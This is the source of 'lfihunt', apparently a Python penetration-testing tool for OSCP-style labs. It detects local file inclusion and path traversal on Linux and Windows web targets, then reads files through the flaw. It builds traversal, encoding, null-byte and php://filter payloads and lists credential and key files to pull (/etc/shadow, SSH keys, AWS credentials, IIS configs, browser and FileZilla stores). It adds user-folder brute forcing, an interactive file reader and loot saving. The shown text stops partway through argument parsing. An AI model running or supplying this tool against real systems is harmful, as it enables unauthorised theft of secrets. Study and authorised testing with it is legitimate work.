#!/usr/bin/env python3
"""
lfihunt - find local file inclusion / path traversal, then read files through it.

  find:  tests Linux + Windows targets with absolute paths, traversal, encoding
         and filter bypasses, path-prefix bypass and php://filter (read-only).
  read:  --read PATH / --shell reuse the working technique to pull any file and
         strip the page around it (diff against a baseline).

OSCP-safe by design: detection + user-directed file reads only. No code
execution wrappers, no log poisoning, no automatic exploitation - those are
printed as manual next steps instead.
"""
import argparse
import base64
import html
import json
import os
import random
import re
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, urlsplit, urlunsplit, parse_qsl

import requests
import urllib3

urllib3.disable_warnings()
VERSION = "1.0"


# ═══════════════════════════════════════════════════════════════ output
class Style:
    on = sys.stdout.isatty()

    @classmethod
    def c(cls, code, s):
        return f"\033[{code}m{s}\033[0m" if cls.on else str(s)


def ok(s):   return Style.c("1;32", s)
def bad(s):  return Style.c("31", s)
def warn(s): return Style.c("33", s)
def dim(s):  return Style.c("2", s)
def hi(s):   return Style.c("1;36", s)


def rule(title=""):
    print(dim(f"── {title} " + "─" * max(4, 66 - len(title))) if title else dim("─" * 70))


# ═══════════════════════════════════════════════════════════════ knowledge
# files used to PROVE the bug: (path, content signature)
PROOF_FILES = [
    ("/etc/passwd",                             r"root:[^:\n]*:0:0:",                  True),
    ("C:\\Windows\\win.ini",                    r"\[fonts\]|for 16-bit app support",   True),
    ("C:\\Windows\\System32\\drivers\\etc\\hosts", r"Microsoft TCP/IP|rhino\.acme\.com", True),
    ("C:\\Windows\\system.ini",                 r"\[drivers\]|\[386Enh\]",             False),
    ("C:\\boot.ini",                            r"\[boot loader\]",                    False),
]
SOURCE_PROBES = [("index.php", r"<\?php"), ("index", r"<\?php")]   # php://filter only

# what to read next once it works (printed, never fetched automatically)
LOOT = {
    "linux": [
        ("/etc/passwd", "users with a shell -> /home/USER/.ssh/id_rsa, .bash_history"),
        ("/proc/self/environ", "env vars of the web process (secrets, paths)"),
        ("/proc/self/cmdline", "how the app was started -> its source path"),
        ("/proc/self/cwd/app.py", "app source via cwd (try app.py, main.py, server.js, index.php)"),
        ("/var/www/html/config.php", "web configs: config.php, wp-config.php, .env, settings.py"),
        ("/etc/apache2/sites-enabled/000-default.conf", "vhosts + DocumentRoot"),
        ("/etc/nginx/sites-enabled/default", "nginx root / proxy targets"),
        ("/var/log/apache2/access.log", "readable log = log poisoning candidate (do it by hand)"),
        ("/etc/shadow", "only if the web user is root"),
        ("/root/.ssh/id_rsa", "same"),
    ],
    "windows": [
        ("C:\\Windows\\Panther\\Unattend.xml", "deployment creds (also Unattend\\Unattend.xml, sysprep\\unattend.xml)"),
        ("C:\\inetpub\\wwwroot\\web.config", "IIS connection strings / machineKey"),
        ("C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config", "IIS sites, app-pool creds"),
        ("C:\\xampp\\passwords.txt", "XAMPP defaults; also C:\\xampp\\apache\\conf\\httpd.conf, php\\php.ini"),
        ("C:\\Users\\USER\\.ssh\\id_rsa", "SSH keys (guess USER from the app, hosts, errors)"),
        ("C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", "PS history"),
        ("C:\\Windows\\repair\\SAM", "old boxes only (+ SYSTEM) -> secretsdump"),
        ("C:\\xampp\\apache\\logs\\access.log", "readable log = log poisoning candidate (do it by hand)"),
    ],
}
# per-user files, filled in with --user NAME. {u} = username.
USER_FILES = {
    "linux": [
        ("/home/{u}/.ssh/id_rsa", "private key -> ssh in"),
        ("/home/{u}/.ssh/id_ed25519", "private key (ed25519)"),
        ("/home/{u}/.ssh/authorized_keys", "which keys are trusted (+ confirms the home path)"),
        ("/home/{u}/.bash_history", "commands, sometimes creds typed inline"),
        ("/home/{u}/.bashrc", "aliases/exports -> paths, tokens"),
        ("/home/{u}/.profile", "login env"),
        ("/home/{u}/.config/git/credentials", "stored git creds"),
        ("/home/{u}/.git-credentials", "same, older location"),
        ("/home/{u}/.aws/credentials", "AWS keys"),
        ("/home/{u}/.mysql_history", "db commands/creds"),
        ("/home/{u}/user.txt", "OSCP/CTF proof flag"),
        ("/home/{u}/.msmtprc", "smtp creds"),
        ("/home/{u}/.netrc", "ftp/http creds"),
    ],
    "windows": [
        ("C:\\Users\\{u}\\.ssh\\id_rsa", "private key -> ssh in"),
        ("C:\\Users\\{u}\\.ssh\\authorized_keys", "trusted keys (+ confirms the profile path)"),
        ("C:\\Users\\{u}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", "PS history -> creds typed inline"),
        ("C:\\Users\\{u}\\Desktop\\user.txt", "OSCP/CTF proof flag"),
        ("C:\\Users\\{u}\\Desktop\\proof.txt", "proof flag (alt name)"),
        ("C:\\Users\\{u}\\AppData\\Roaming\\Microsoft\\Credentials\\", "DPAPI blobs (dir listing won't work; note for mimikatz later)"),
        ("C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data", "browser creds db (binary)"),
        ("C:\\Users\\{u}\\AppData\\Roaming\\FileZilla\\sitemanager.xml", "FileZilla saved servers + creds"),
        ("C:\\Users\\{u}\\AppData\\Roaming\\FileZilla\\recentservers.xml", "FileZilla recent servers"),
        ("C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Windows\\WinX\\...", "misc"),
        ("C:\\Users\\{u}\\.aws\\credentials", "AWS keys"),
        ("C:\\Users\\{u}\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\", "recent files (dir; note for later)"),
        ("C:\\Users\\{u}\\Documents\\", "loot (dir listing won't work over LFI; guess file names)"),
    ],
}
# dirs searched by --user-wordlist (filename brute inside a known user). {u} = username.
USER_DIRS = {
    "linux": ["/home/{u}/", "/home/{u}/Desktop/", "/home/{u}/Documents/",
              "/home/{u}/Downloads/", "/home/{u}/.ssh/", "/home/{u}/.config/"],
    "windows": ["C:\\Users\\{u}\\", "C:\\Users\\{u}\\Desktop\\", "C:\\Users\\{u}\\Documents\\",
                "C:\\Users\\{u}\\Downloads\\", "C:\\Users\\{u}\\.ssh\\"],
}
# built-in filename list for --user-wordlist with no file
BUILTIN_FILENAMES = [
    "user.txt", "proof.txt", "local.txt", "root.txt", "flag.txt", "creds.txt", "credentials.txt",
    "passwords.txt", "password.txt", "pass.txt", "secret.txt", "secrets.txt", "notes.txt", "note.txt",
    "todo.txt", "backup.txt", "config.txt", "readme.txt", "info.txt", ".env",
    "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "authorized_keys", "known_hosts",
    "passwords.xlsx", "passwords.csv", "accounts.xlsx", "vault.kdbx", "keepass.kdbx", "database.kdbx",
    "web.config", "config.php", "wp-config.php", "settings.py", ".bash_history", ".git-credentials",
]
NOTES = {
    "windows": [
        "NTFS is case-insensitive: dodge extension blacklists with app.PY, app.py., app.py::$DATA",
        "Relative paths read from the app's folder: try app.py, ..\\app.py, web.config",
        "Need a hash? Point the param at \\\\KALI\\share\\x with responder running (UNC path) - manual",
    ],
    "linux": [
        "Relative reads hit the app's cwd: try app.py, ../app.py, .env, config.php",
        "Readable logs / /proc/self/fd/N + PHP include = log poisoning (manual, outside this tool)",
    ],
    "php": [
        "php://filter works: read the source (index.php, config.php, includes) - look for creds and other includes",
    ],
}

ERROR_LEAKS = [
    r"failed to open stream", r"No such file or directory", r"FileNotFoundError",
    r"\b(include|require)(_once)?\(", r"open_basedir", r"\[Errno \d+\]",
    r"System\.IO\.\w*NotFoundException", r"Could not find (a part of )?the path",
    r"java\.io\.FileNotFoundException", r"file_get_contents\(", r"fopen\(", r"ENOENT",
]

PARAM_GUESSES = [
    "file", "filename", "filepath", "path", "page", "include", "inc", "doc", "document",
    "folder", "dir", "root", "template", "tpl", "view", "layout", "lang", "language",
    "log", "logfile", "load", "read", "show", "content", "cat", "conf", "config",
    "module", "name", "src", "download", "item", "pg", "style", "pdf", "img", "image",
    "f", "p", "type", "theme", "locale", "report", "resource", "url",
]


# ═══════════════════════════════════════════════════════════════ paths & techniques
def parse_path(p):
    """-> (os, drive, parts, relative)"""
    m = re.match(r"^([a-zA-Z]):[\\/]*(.*)$", p)
    if m:
        return "windows", m.group(1).upper(), [x for x in re.split(r"[\\/]+", m.group(2)) if x], False
    rel = not p.startswith(("/", "\\"))
    return "linux", None, [x for x in re.split(r"[\\/]+", p) if x], rel


class Tech:
    """A way of turning a path into a payload."""

    def __init__(self, name, kind, fn, decode=False):
        self.name, self.kind, self.fn, self.decode = name, kind, fn, decode

    def build(self, path):
        os_, drive, parts, rel = parse_path(path)
        if rel:   # relative paths are sent as typed (or wrapped)
            return f"php://filter/convert.base64-encode/resource={path}" if self.decode else path
        return self.fn(os_, drive or "C", parts)


TRAV_UNITS = [
    ("../", "/"), ("..\\", "\\"), ("....//", "/"), ("....\\\\", "\\"), ("..././", "/"), ("..\\/", "/"),
    ("..%2f", "%2f"), ("%2e%2e/", "/"), ("%2e%2e%2f", "%2f"), ("..%5c", "%5c"), ("%2e%2e%5c", "%5c"),
    ("%252e%252e%252f", "%252f"), ("..%252f", "%252f"), ("..%c0%af", "/"), ("%c0%ae%c0%ae/", "/"),
]
BASIC_UNITS = ("../", "..\\", "....//")


def win(fn):   # technique only meaningful for Windows paths
    return lambda o, d, p: fn(d, p) if o == "windows" else None


def lin(fn):
    return lambda o, d, p: fn(p) if o == "linux" else None


def techniques(quick=False, prefix=""):
    T = []
    add = lambda name, kind, fn, decode=False: T.append(Tech(name, kind, fn, decode))

    add("abs", "absolute", lambda o, d, p: "/" + "/".join(p) if o == "linux" else f"{d}:\\" + "\\".join(p))
    add("abs-fwd", "absolute", win(lambda d, p: f"{d}:/" + "/".join(p)))
    add("abs-nodrive", "absolute", win(lambda d, p: "\\" + "\\".join(p)))
    add("abs-nodrive-fwd", "absolute", win(lambda d, p: "/" + "/".join(p)))
    if not quick:
        add("abs-lower", "absolute", win(lambda d, p: f"{d.lower()}:\\" + "\\".join(p).lower()))
        add("abs-double", "absolute", lambda o, d, p: "//" + "//".join(p) if o == "linux" else f"{d}:\\\\" + "\\\\".join(p))
        add("abs-dotseg", "absolute", lin(lambda p: "/" + "/./".join(p)))
        add("abs-enc", "absolute+encoding", lambda o, d, p: "%2f" + "%2f".join(p) if o == "linux" else f"{d}:%5c" + "%5c".join(p))
        add("file-uri", "file://", lambda o, d, p: "file:///" + "/".join(p) if o == "linux" else f"file:///{d}:/" + "/".join(p))
        add("abs-null", "absolute+nullbyte", lambda o, d, p: ("/" + "/".join(p) if o == "linux" else f"{d}:\\" + "\\".join(p)) + "%00")
        add("abs-ads", "absolute+ADS", win(lambda d, p: f"{d}:\\" + "\\".join(p) + "::$DATA"))

    units = [u for u in TRAV_UNITS if u[0] in BASIC_UNITS] if quick else TRAV_UNITS
    depths = (4, 8) if quick else range(1, 11)
    for unit, sep in units:
        for n in depths:
            mk = lambda o, d, p, u=unit, s=sep, n=n: u * n + s.join(p)
            add(f"trav[{unit}]x{n}", "traversal", mk)
            if prefix:
                add(f"prefix+trav[{unit}]x{n}", "prefix+traversal", lambda o, d, p, f=mk: prefix + f(o, d, p))
            if unit in BASIC_UNITS and not quick:
                add(f"/trav[{unit}]x{n}", "traversal", lambda o, d, p, f=mk: "/" + f(o, d, p))
                add(f"trav[{unit}]x{n}+null", "traversal+nullbyte", lambda o, d, p, f=mk: f(o, d, p) + "%00")
    if not quick:
        add("php-filter", "php://filter",
            lambda o, d, p: "php://filter/convert.base64-encode/resource=" +
            ("/" + "/".join(p) if o == "linux" else f"{d}:/" + "/".join(p)), decode=True)
    return T


def b64_blobs(text):
    out = []
    for blob in re.findall(r"[A-Za-z0-9+/]{12,}={0,2}", text):
        try:
            out.append(base64.b64decode(blob + "=" * (-len(blob) % 4)).decode("utf-8", "replace"))
        except Exception:
            pass
    return "\n".join(out)


# ═══════════════════════════════════════════════════════════════ injection points
class Point:
    def __init__(self, name, loc, template, orig=""):
        self.name, self.loc, self.template, self.orig = name, loc, template, orig  # template holds FUZZ


SAFE = "/%:.-_~!$'()*,;=@?&"   # '%' kept so pre-encoded payloads go out as-is; '+' '#' get encoded


def q(v):
    return quote(v, safe=SAFE)


def pair_template(pairs, target, append=False):
    parts = [f"{q(k)}={'FUZZ' if k == target else q(v)}" for k, v in pairs]
    if append:
        parts.append(f"{q(target)}=FUZZ")
    return "&".join(parts)


def find_points(url, body, headers, params):
    """-> (points, discovery?)"""
    if "FUZZ" in url:
        return [Point("FUZZ@url", "url", url)], False
    if body and "FUZZ" in body:
        return [Point("FUZZ@body", "body", body)], False
    for k, v in headers.items():
        if "FUZZ" in v:
            return [Point(f"FUZZ@{k}", "header:" + k, v)], False
    if url.endswith("=") and not params and not body:
        return [Point(urlsplit(url).query.split("&")[-1][:-1] or "param", "url", url + "FUZZ")], False

    sp = urlsplit(url)
    qp = parse_qsl(sp.query, keep_blank_values=True)
    bp = parse_qsl(body, keep_blank_values=True) if body and "=" in body and not body.lstrip().startswith("{") else []
    with_q = lambda query: urlunsplit((sp.scheme, sp.netloc, sp.path or "/", query, ""))

    if params:
        if body:
            return [Point(p, "body", pair_template(bp, p, p not in dict(bp))) for p in params], False
        return [Point(p, "url", with_q(pair_template(qp, p, p not in dict(qp)))) for p in params], False
    pts = [Point(k, "url", with_q(pair_template(qp, k)), v) for k, v in qp]
    pts += [Point(k, "body", pair_template(bp, k), v) for k, v in bp]
    if pts:
        return pts, False
    return [Point(p, "url", with_q(pair_template(qp, p, True))) for p in PARAM_GUESSES], True


def load_burp(path, https):
    raw = open(path, encoding="utf-8", errors="replace").read().replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = head.split("\n")
    method, target = lines[0].split(" ")[:2]
    hdrs = {}
    for line in lines[1:]:
        k, _, v = line.partition(":")
        if k.strip():
            hdrs[k.strip()] = v.strip()
    host = hdrs.pop("Host", None) or hdrs.pop("host")
    hdrs.pop("Content-Length", None)
    url = target if target.startswith("http") else f"{'https' if https else 'http'}://{host}{target}"
    return method.upper(), url, hdrs, body.rstrip("\n") or None


# ═══════════════════════════════════════════════════════════════ engine
class Probe:
    def __init__(self, a):
        self.a = a
        self.method, self.url, self.headers, self.body = "GET", a.url, {}, a.data
        if a.request:
            self.method, self.url, self.headers, rbody = load_burp(a.request, a.https)
            self.body = a.data or rbody
        if self.body and self.method == "GET":
            self.method = "POST"
        for h in a.header or []:
            k, _, v = h.partition(":")
            self.headers[k.strip()] = v.strip()
        if a.cookie:
            self.headers["Cookie"] = a.cookie
        self.json_body = "json" in self.headers.get("Content-Type", "").lower() or \
                         bool(self.body and self.body.lstrip().startswith("{"))
        if self.body and "Content-Type" not in self.headers:
            self.headers["Content-Type"] = "application/json" if self.json_body else "application/x-www-form-urlencoded"
        self.headers.setdefault("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0")

        self.http = requests.Session()
        self.http.verify = False
        if a.proxy:
            self.http.proxies = {"http": a.proxy, "https": a.proxy}
        self.lock = threading.Lock()
        self.stop = threading.Event()
        self.hits, self.leaks, self.sent = [], {}, 0
        self.progress = [0, 0]

    # ---- transport
    def encode_body(self, v):
        return json.dumps(v)[1:-1] if self.json_body else q(v)

    def send(self, pt, payload):
        url, body, hdrs = self.url, self.body, dict(self.headers)
        if pt.loc == "url":
            url = pt.template.replace("FUZZ", q(payload))
        elif pt.loc == "body":
            body = pt.template.replace("FUZZ", self.encode_body(payload))
        else:
            hdrs[pt.loc.split(":", 1)[1]] = pt.template.replace("FUZZ", payload)
        prep = self.http.prepare_request(requests.Request(self.method, url, data=body, headers=hdrs))
        prep.url = url   # keep payload bytes exactly as built
        if self.a.delay:
            time.sleep(self.a.delay)
        try:
            r = self.http.send(prep, timeout=self.a.timeout, allow_redirects=not self.a.no_redirect)
            with self.lock:
                self.sent += 1
            return r.status_code, r.text
        except requests.RequestException as e:
            return None, f"{type(e).__name__}: {e}"

    def baseline(self, pt, tech=None):
        junk = "lfp_" + "".join(random.choices(string.ascii_lowercase, k=10))
        payload = tech.build("/" + junk + ".txt") if tech else junk + ".txt"
        return self.send(pt, payload or junk)

    @staticmethod
    def leak(text):
        for pat in ERROR_LEAKS:
            m = re.search(pat, text, re.I)
            if m:
                s, e = text.rfind("\n", 0, m.start()) + 1, text.find("\n", m.end())
                return re.sub(r"<[^>]+>", "", text[s:e if e != -1 else None]).strip()[:150]
        return None

    # ---- find
    def jobs(self, pt, quick):
        prefix = self.a.prefix or ""
        if not prefix and re.search(r"[/\\]", pt.orig):
            prefix = re.sub(r"[^/\\]*$", "", pt.orig)
            print(f"  {dim('prefix')}  {pt.name}: traversal will also start from {hi(prefix)}")
        self.prefix = prefix
        techs = techniques(quick, prefix)
        seen, out = set(), []
        for path, sig, core in PROOF_FILES:
            os_ = parse_path(path)[0]
            if (self.a.os not in ("both", os_)) or (quick and not core):
                continue
            for t in techs:
                p = t.build(path)
                if p and p not in seen:
                    seen.add(p)
                    out.append((p, path, sig, t))
        if not quick:
            src = Tech("php-filter-src", "php://filter (source)", None, decode=True)
            for name, sig in SOURCE_PROBES:
                p = f"php://filter/convert.base64-encode/resource={name}"
                out.append((p, f"source:{name}", sig, src))
        return out

    def check(self, pt, base, job):
        if self.stop.is_set():
            return
        payload, target, sig, tech = job
        code, text = self.send(pt, payload)
        with self.lock:
            self.progress[0] += 1
            if sys.stderr.isatty() and not self.a.verbose:
                sys.stderr.write(f"\r  {dim('probing')} {pt.name:<14} {self.progress[0]}/{self.progress[1]} ")
                sys.stderr.flush()
        if code is None:
            if self.a.verbose:
                print(f"  {bad('err')}  {payload}  {dim(text[:70])}")
            return
        hay, bhay = (text + "\n" + b64_blobs(text), base + "\n" + b64_blobs(base)) if tech.decode else (text, base)
        m = re.search(sig, hay)
        if m and not re.search(sig, bhay):
            with self.lock:
                if self.a.first and self.stop.is_set():
                    return
                first_for_target = not any(h["point"] == pt.name and h["target"] == target for h in self.hits)
                self.hits.append(dict(point=pt.name, target=target, tech=tech.name, kind=tech.kind,
                                      payload=payload, status=code, decode=tech.decode))
                if first_for_target:
                    snippet = hay[m.start():m.end() + 40].split("\n")[0].strip()
                    sys.stderr.write("\r" + " " * 60 + "\r") if sys.stderr.isatty() else None
                    print(f"  {ok('HIT')}  {pt.name}  {hi(target)}  {dim(tech.kind)}  [{code}]\n"
                          f"       {payload}\n       {dim('> ' + snippet)}")
                if self.a.first:
                    self.stop.set()
        elif self.a.verbose:
            print(f"  {dim('--')}  {code} {len(text):>7}  {payload}")

    def find(self):
        points, discovery = find_points(self.url, self.body, self.headers, self.a.param)
        quick = self.a.quick or discovery
        rule("lfihunt " + VERSION)
        print(f"  target   {self.method} {self.url}")
        names = ", ".join(p.name for p in points[:10]) + (" …" if len(points) > 10 else "")
        print(f"  {'guessing' if discovery else 'testing'}  {names}")
        print(f"  mode     os={self.a.os}  {'quick' if quick else 'full'} set  threads={self.a.threads}")
        rule()
        for pt in points:
            if self.stop.is_set():
                break
            bcode, btext = self.baseline(pt)
            if bcode is None:
                print(f"  {bad('!!')}  {pt.name}: {btext}")
                return False
            lk = self.leak(btext)
            if lk:
                self.leaks[pt.name] = lk
                print(f"  {warn('LEAK')} {pt.name}: file error for a missing file -> param reaches a file API\n"
                      f"       {dim(lk)}")
            jobs = self.jobs(pt, quick)
            self.progress = [0, len(jobs)]
            with ThreadPoolExecutor(self.a.threads) as ex:
                list(ex.map(lambda j: self.check(pt, btext, j), jobs))
            if sys.stderr.isatty():
                sys.stderr.write("\r" + " " * 60 + "\r")
        self.report(discovery)
        return bool(self.hits)

    def report(self, discovery):
        rule("results")
        print(f"  {self.sent} requests")
        if self.a.json:
            with open(self.a.json, "w") as f:
                json.dump(dict(target=self.url, method=self.method, hits=self.hits, leaks=self.leaks), f, indent=2)
            print(f"  saved  {self.a.json}")
        if not self.hits:
            print(f"  {bad('no confirmed LFI')}" + (f"  ({warn('but file errors leaked on: ' + ', '.join(self.leaks))})" if self.leaks else ""))
            print(dim("  try: -c/-H for auth, -r burp.req, --os, -p NAME, a FUZZ marker, --prefix, header FUZZ"))
            return
        groups = {}
        for h in self.hits:
            groups.setdefault((h["point"], h["target"]), []).append(h)
        print(f"  {'param':<12} {'file':<42} {'ways':>4}  shortest payload")
        for (pt, tgt), hs in groups.items():
            best = min(hs, key=lambda h: len(h["payload"]))
            print(f"  {pt:<12} {tgt:<42} {len(hs):>4}  {ok(best['payload'])}")
        if discovery:
            print(dim("  (guessing used the quick set - rerun with -p NAME for encodings, wrappers, null bytes)"))
        self.hints()

    def user_paths(self, os_):
        """Per-user loot paths for every --user, for OS os_. -> [(path, why)]"""
        out = []
        for u in self.a.user or []:
            for tpl, why in USER_FILES[os_]:
                out.append((tpl.format(u=u), why))
        return out

    def user_brute_paths(self, os_):
        """--user-wordlist: dir x filename for every user, for OS os_. -> [path]"""
        if not self.a.user_wordlist:
            return []
        names = (BUILTIN_FILENAMES if self.a.user_wordlist == "__builtin__"
                 else [l.strip() for l in open(self.a.user_wordlist, encoding="utf-8", errors="replace")
                       if l.strip() and not l.startswith("#")])
        sep = "/" if os_ == "linux" else "\\"
        out, seen = [], set()
        for u in self.a.user or []:
            for d in USER_DIRS[os_]:
                for n in names:
                    p = d.format(u=u).rstrip("/\\") + sep + n
                    if p not in seen:
                        seen.add(p)
                        out.append(p)
        return out

    def hints(self):
        oses = {parse_path(h["target"])[0] for h in self.hits if not h["target"].startswith("source:")}
        php = any(h["decode"] for h in self.hits)
        rule("next (manual)")
        for o in sorted(oses):
            for path, why in LOOT[o]:
                print(f"  {hi(path)}\n      {dim(why)}")
            for path, why in self.user_paths(o):
                print(f"  {hi(path)}\n      {dim(why)}")
            for n in NOTES[o]:
                print(f"  {warn('*')} {n}")
        if php:
            for n in NOTES["php"]:
                print(f"  {warn('*')} {n}")
        if not self.a.user:
            print(dim("  know a username? add  --user NAME  to list that user's folder (keys, history, flag)"))
        print(dim("  read any of these:  add  --shell  (or --read PATH) to the same command"))

    # ---- read
    def best_tech(self):
        """Pick the technique with the widest coverage, then the shortest payload."""
        score = {}
        for h in self.hits:
            if h["tech"] == "php-filter-src":
                continue
            s = score.setdefault(h["tech"], [set(), 999, h["point"]])
            s[0].add(h["target"])
            s[1] = min(s[1], len(h["payload"]))
        if not score:
            return None, None
        techs = {t.name: t for t in techniques(False, getattr(self, "prefix", self.a.prefix or ""))}
        ranked = sorted(score, key=lambda k: (-len(score[k][0]), score[k][1]))
        # prefer plain absolute paths (keep drive letters, read anything) if they work too
        hit = next(h for h in self.hits if h["tech"] == ranked[0])
        sig = next(s for p, s, _ in PROOF_FILES if p == hit["target"])
        pt = next(p for p in find_points(self.url, self.body, self.headers, self.a.param)[0] if p.name == hit["point"])
        for name in ["abs", "abs-fwd"]:
            if name in score:
                return techs[name], hit["point"]
            payload = techs[name].build(hit["target"])
            if payload:
                code, text = self.send(pt, payload)
                if code is not None and re.search(sig, text):
                    return techs[name], hit["point"]
        return techs.get(ranked[0]), hit["point"]

    @staticmethod
    def strip_page(base, resp):
        if resp == base:
            return ""
        n = min(len(base), len(resp))
        i = 0
        while i < n and base[i] == resp[i]:
            i += 1
        j = 0
        while j < n - i and base[-1 - j] == resp[-1 - j]:
            j += 1
        i = max(resp.rfind("\n", 0, i), resp.rfind(">", 0, i)) + 1
        end = len(resp) - j
        cut = [x for x in (resp.find("\n", end), resp.find("<", end)) if x != -1]
        end = min(cut) if cut and j else end
        return html.unescape(resp[i:end]).strip("\n")

    def read(self, pt, tech, path):
        payload = tech.build(path) if tech else path
        if payload is None:      # technique can't express this path (e.g. win-only tech, linux path)
            payload = path
        code, text = self.send(pt, payload)
        if code is None:
            return None, text
        _, base = self.baseline(pt, tech if tech and not parse_path(path)[3] else None)
        body = self.strip_page(base or "", text)
        if tech and tech.decode:
            blobs = [b for b in re.findall(r"[A-Za-z0-9+/]{8,}={0,2}", text) if b not in (base or "")]
            if blobs:
                body = b64_blobs(max(blobs, key=len))
        lk = self.leak(body) if len(body) < 600 else None   # short body that is just an error page
        if not body.strip() or lk:
            lk = lk or self.leak(text)
            return None, f"[{code}] not readable" + (f" - {lk}" if lk else " (missing, denied, or filtered)")
        return payload, body

    def save(self, path, body):
        if not self.a.loot:
            return ""
        os.makedirs(self.a.loot, exist_ok=True)
        fn = os.path.join(self.a.loot, re.sub(r"[^A-Za-z0-9._-]+", "_", path).strip("_") or "file")
        with open(fn, "w") as f:
            f.write(body)
        return fn

    def reader(self, paths, shell):
        if self.a.raw:
            pts, _ = find_points(self.url, self.body, self.headers, self.a.param)
            pt, tech = pts[0], None
            print(f"  {dim('raw mode: paths are sent exactly as typed into')} {pt.name}")
        else:
            tech, pname = self.best_tech()
            if not tech:
                print(f"  {bad('nothing to read with')} - no working technique found")
                return
            pt = next(p for p in find_points(self.url, self.body, self.headers, self.a.param)[0] if p.name == pname)
            print(f"  reading via {hi(pt.name)} using {hi(tech.name)} ({tech.kind})")

        def hit_link(payload):
            """How to request this payload, for the enum list."""
            if pt.loc == "url":
                return pt.template.replace("FUZZ", q(payload))
            if pt.loc == "body":
                return f"{self.method} {self.url}  [body] {pt.template.replace('FUZZ', self.encode_body(payload))}"
            return f"{self.url}  [{pt.loc}] {pt.template.replace('FUZZ', payload)}"

        def one(path, quiet=False):
            payload, body = self.read(pt, tech, path.strip())
            if payload is None:
                if not quiet:
                    print(f"  {bad('--')} {path}: {body}")
                return False
            rule(path)
            print(body)
            saved = self.save(path, body)
            print(dim(f"  ({len(body)} bytes via {payload})" + (f"  saved -> {saved}" if saved else "")))
            return True

        def enum_one(path):
            """User-enum: show the link that hit, not the file contents."""
            payload, body = self.read(pt, tech, path.strip())
            if payload is None:
                return False
            saved = self.save(path, body)
            tail = dim(f"({len(body)}b" + (f", saved {os.path.basename(saved)}" if saved else "") + ")")
            print(f"  {ok('HIT')} {path}\n      {dim(hit_link(payload))}  {tail}")
            return True

        if self.a.user and not self.a.raw:
            oses = {parse_path(h["target"])[0] for h in self.hits if not h["target"].startswith("source:")}
            auto = [p for o in sorted(oses) for p, _ in self.user_paths(o) if not p.rstrip().endswith(("\\", "/"))]
            brute = [p for o in sorted(oses) for p in self.user_brute_paths(o)]
            auto += [p for p in brute if p not in set(auto)]
            extra = f" (+{len(brute)} from wordlist)" if brute else ""
            print(f"  {dim('enumerating')} {', '.join(self.a.user)}: {len(auto)} paths{extra} (misses hidden)")
            found = sum(enum_one(p) for p in auto)
            print(f"  {dim('user enum:')} {ok(str(found))} readable / {len(auto)}"
                  + ("" if self.a.loot else dim("   (add --loot DIR to save, or --read PATH to dump one)")))

        for p in paths:
            one(p)
        if shell:
            try:
                import readline  # noqa: F401  (history / arrow keys)
            except ImportError:
                pass
            print(dim("  type a path (absolute or relative to the app), 'hints', or 'exit'"))
            while True:
                try:
                    line = input(hi("file> ")).strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    break
                if line in ("exit", "quit", "q"):
                    break
                if line == "hints":
                    self.hints()
                elif line:
                    one(line)


# ═══════════════════════════════════════════════════════════════ cli
def main():
    ap = argparse.ArgumentParser(
        prog="lfihunt",
        description="Find LFI / path traversal (Linux + Windows), then read files through it.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""where to inject (first match wins):
  FUZZ in URL / body / header  ->  that spot
  URL ending in '='            ->  appended
  -p NAME[,NAME]               ->  those params (added if missing)
  existing params              ->  each one
  no params                    ->  guesses ~45 common names (quick set)

examples:
  lfihunt.py -u 'http://10.10.10.5/logs?file=app.log'
  lfihunt.py -u 'http://10.10.10.5/logs' --os windows
  lfihunt.py -u 'http://10.10.10.5/index.php?page=home' -c 'PHPSESSID=x' --shell
  lfihunt.py -r burp.req                         # Burp 'Copy to file', FUZZ optional
  lfihunt.py -u 'http://t/dl' -d 'path=FUZZ'       # POST (JSON bodies work too)
  lfihunt.py -u 'http://t/' -H 'Cookie: lang=FUZZ'  # header / cookie LFI
  lfihunt.py -u 'http://t/logs?file=FUZZ' --raw --read 'C:\\Windows\\win.ini'
""")
    g = ap.add_argument_group("target")
    g.add_argument("-u", "--url", help="target URL")
    g.add_argument("-r", "--request", help="raw HTTP request file (Burp)")
    g.add_argument("--https", action="store_true", help="use https with -r")
    g.add_argument("-d", "--data", help="request body (form or JSON)")
    g.add_argument("-p", "--param", type=lambda s: s.split(","), help="param(s) to test")
    g.add_argument("-c", "--cookie", help="Cookie header value")
    g.add_argument("-H", "--header", action="append", help="'Name: value' (repeatable)")

    g = ap.add_argument_group("find")
    g.add_argument("--os", choices=["both", "linux", "windows"], default="both")
    g.add_argument("-q", "--quick", action="store_true", help="small payload set")
    g.add_argument("--prefix", help="start traversal from this path (auto from current value)")
    g.add_argument("--first", action="store_true", help="stop at first hit")

    g = ap.add_argument_group("read")
    g.add_argument("--read", action="append", default=[], metavar="PATH", help="read file(s) after finding (repeatable)")
    g.add_argument("--user", action="append", metavar="NAME", help="enumerate this user's home/profile (keys, history, flag); repeatable and comma-separated")
    g.add_argument("--user-file", metavar="FILE", help="file of usernames to enumerate, one per line")
    g.add_argument("--user-wordlist", nargs="?", const="__builtin__", metavar="FILE",
                   help="also brute common filenames in each user's Desktop/Documents/Downloads; FILE optional (built-in list if omitted)")
    g.add_argument("--shell", action="store_true", help="interactive file reader after finding")
    g.add_argument("--raw", action="store_true", help="skip finding; send paths as typed into the FUZZ spot")
    g.add_argument("--loot", metavar="DIR", help="save every file read into DIR")

    g = ap.add_argument_group("http")
    g.add_argument("-t", "--threads", type=int, default=10)
    g.add_argument("--delay", type=float, default=0, help="seconds between requests per thread")
    g.add_argument("--timeout", type=float, default=8)
    g.add_argument("--proxy", help="http://127.0.0.1:8080")
    g.add_argument("--no-redirect", action="store_true")

